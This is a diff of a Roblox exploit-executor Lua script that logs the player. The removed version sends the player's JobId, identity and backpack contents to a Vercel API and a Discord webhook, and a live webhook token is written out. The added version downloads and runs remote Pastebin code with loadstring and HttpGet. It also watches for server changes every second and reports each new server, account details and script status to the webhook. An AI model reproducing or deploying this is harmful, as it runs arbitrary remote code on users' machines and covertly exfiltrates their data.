@@ -1,134 +1,212 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
--- Konfigurasi
-local jobId = tostring(game.JobId)
-local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
-local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+-- ======= CONFIGURATION =======
+local API_ENDPOINT = "api-rho-nine-77.vercel.app/api/setInstanceId"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
+-- =============================
+
 local player = Players.LocalPlayer
+local currentJobId = game.JobId
 local playerName = player.Name
+local playerUserId = player.UserId
 
--- Fungsi untuk memastikan string aman untuk Discord
-local function sanitizeString(str)
-    return tostring(str):gsub("[%c%z]", ""):sub(1, 1000)
-end
-
--- Ambil fungsi http request yang tersedia dari executor
-local httpRequest = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request))
-
-if typeof(httpRequest) ~= "function" then
-    warn("❌ Executor tidak mendukung http request!")
-    return
-end
-
--- Fungsi bantu untuk request dengan error handling
-local function safeRequest(requestTable)
-    local success, response = pcall(function()
-        return httpRequest(requestTable)
-    end)
-    if not success then
-        warn("❌ Error saat melakukan HTTP request:", response)
-        return nil
+-- Improved HTTP request with retry logic
+local function httpRequest(url, method, body, headers, retries)
+    retries = retries or 3
+    local requestFunc = syn and syn.request or http_request or request
+    if not requestFunc then return nil end
+    
+    for i = 1, retries do
+        local success, response = pcall(function()
+            return requestFunc({
+                Url = url,
+                Method = method,
+                Headers = headers or {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = body
+            })
+        end)
+        
+        if success and response then
+            return response
+        end
+        wait(1) -- Wait before retrying
     end
-    return response
+    return nil
 end
 
--- Fungsi untuk mendapatkan isi backpack
 local function getBackpackContents()
     local contents = {}
     local backpack = player:FindFirstChild("Backpack")
-    if not backpack then return "Backpack tidak ditemukan" end
+    if not backpack then return "Backpack not found" end
     
     for _, item in ipairs(backpack:GetChildren()) do
         table.insert(contents, item.Name)
     end
     
-    if #contents == 0 then
-        return "Backpack kosong"
+    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
+end
+
+local function executeExternalScript()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
+    end)
+    if not success then
+        warn("⚠️ Failed to execute external script:", err)
+    end
+    return success
+end
+
+local function updateInstanceInDatabase()
+    local data = {
+        instanceId = currentJobId,
+        username = player.Name,  -- Added required username field
+        player = {
+            userId = playerUserId,
+            name = player.Name,
+            accountAge = player.AccountAge,
+            displayName = player.DisplayName
+        },
+        timestamp = os.time(),
+        additionalData = {
+            gameId = game.GameId,
+            placeId = game.PlaceId
+        }
+    }
+    
+    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
+    
+    if response then
+        print("API Response:", response.StatusCode, response.Body)
+        
+        if response.StatusCode == 200 then
+            print("✅ Successfully updated instance ID and user data in database")
+            print("   Instance ID:", currentJobId)
+            print("   User ID:", playerUserId)
+            return true
+        else
+            warn("❌ API Error:", response.Body)
+            return false
+        end
     else
-        return table.concat(contents, ", "):sub(1, 1000)  -- Batasi panjang string
+        warn("❌ No response from server")
+        return false
     end
 end
 
--- Kirim ke API
-local jsonData = HttpService:JSONEncode({ instanceId = jobId })
-local apiResponse = safeRequest({
-    Url = apiEndpoint,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = jsonData
-})
-
-if apiResponse and apiResponse.StatusCode == 200 then
-    print("✅ InstanceId berhasil dikirim ke API:", jobId)
-else
-    warn("❌ Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
-end
-
--- Dapatkan isi backpack
-local backpackContents = sanitizeString(getBackpackContents())
-
--- Siapkan data untuk webhook
-local embedData = {
-    username = "Logger",
-    embeds = {
-        {
-            title = "🟢 Script Dijalankan",
-            description = string.format("**%s** menjalankan script\n📡 **JobId:** `%s`", 
-                                      sanitizeString(playerName), 
-                                      sanitizeString(jobId)),
-            color = 65280,
-            timestamp = DateTime.now():ToIsoDate(),
-            fields = {
-                {
-                    name = "🎒 Isi Backpack",
-                    value = backpackContents,
-                    inline = false
+local function sendServerChangeNotification()
+    local embed = {
+        username = "Server Tracker",
+        embeds = {
+            {
+                title = "🔄 Server Change Detected",
+                description = string.format("**%s** (UserID: %d) changed servers\n**New JobID:** `%s`", 
+                    playerName, playerUserId, currentJobId),
+                color = 16776960, -- Yellow
+                timestamp = DateTime.now():ToIsoDate(),
+                fields = {
+                    {
+                        name = "👤 Player Info",
+                        value = string.format("UserID: %d\nDisplay Name: %s\nAccount Age: %d days", 
+                            playerUserId, player.DisplayName, player.AccountAge),
+                        inline = true
+                    },
+                    {
+                        name = "📦 Backpack Contents",
+                        value = getBackpackContents(),
+                        inline = true
+                    },
+                    {
+                        name = "🎮 Game Info",
+                        value = string.format("Game ID: %d\nPlace ID: %d", game.GameId, game.PlaceId),
+                        inline = false
+                    },
+                    {
+                        name = "📜 External Script Status",
+                        value = executeExternalScript() and "✅ Executed successfully" or "❌ Failed to execute",
+                        inline = false
+                    }
                 },
-                {
-                    name = "👤 Info Player",
-                    value = string.format("UserID: %d\nAccount Age: %d hari", 
-                                        player.UserId, 
-                                        player.AccountAge),
-                    inline = true
+                footer = {
+                    text = "Auto Server Tracker v3.3 | UserID: "..playerUserId
                 }
-            },
-            footer = {
-                text = "Logger System"
             }
         }
     }
-}
+    
+    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+end
 
--- Pastikan data embed valid
-local success, webhookBody = pcall(function()
-    return HttpService:JSONEncode(embedData)
+-- Main function to handle server joins/changes
+local function handleServerJoin()
+    -- Run external script asynchronously
+    spawn(executeExternalScript)
+    
+    -- Update database with instance and user info
+    local attempts = 0
+    local maxAttempts = 3
+    local success = false
+    
+    while attempts < maxAttempts and not success do
+        attempts += 1
+        success = updateInstanceInDatabase()
+        if not success then
+            wait(2) -- Wait before retrying
+        end
+    end
+    
+    -- Send notification
+    sendServerChangeNotification()
+end
+
+-- Server change detection system
+local function monitorServerChanges()
+    local lastJobId = currentJobId
+    
+    while true do
+        local newJobId = game.JobId
+        if newJobId ~= lastJobId then
+            print("🔄 Detected server change:", lastJobId, "→", newJobId)
+            currentJobId = newJobId
+            lastJobId = newJobId
+            handleServerJoin() -- Process the server change
+        end
+        wait(1) -- Check every second
+    end
+end
+
+-- Initial execution
+local success, err = pcall(function()
+    print("🚀 Initializing Server Tracker for UserID:", playerUserId)
+    handleServerJoin() -- Run for initial join
+    monitorServerChanges() -- Start monitoring for changes
 end)
 
 if not success then
-    warn("❌ Gagal encode data webhook:", webhookBody)
-    return
-end
-
--- Kirim ke Discord Webhook
-local webhookResponse = safeRequest({
-    Url = webhookUrl,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = webhookBody
-})
-
-if webhookResponse then
-    if webhookResponse.StatusCode == 200 or webhookResponse.StatusCode == 204 then
-        print("✅ Webhook Discord terkirim!")
-    else
-        warn("❌ Gagal kirim webhook (Status "..webhookResponse.StatusCode.."):", 
-             webhookResponse.Body or "Tidak ada response body")
-    end
-else
-    warn("❌ Gagal kirim webhook: Tidak ada respons")
+    warn("❌ Critical error in server tracker:", err)
+    -- Attempt to send error notification
+    local errorEmbed = {
+        username = "Server Tracker - ERROR",
+        embeds = {
+            {
+                title = "❌ Script Error Occurred",
+                description = string.format("UserID: %d encountered an error", playerUserId),
+                color = 16711680, -- Red
+                fields = {
+                    {
+                        name = "Error Details",
+                        value = tostring(err),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "UserID: "..playerUserId
+                }
+            }
+        }
+    }
+    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(errorEmbed))
 end
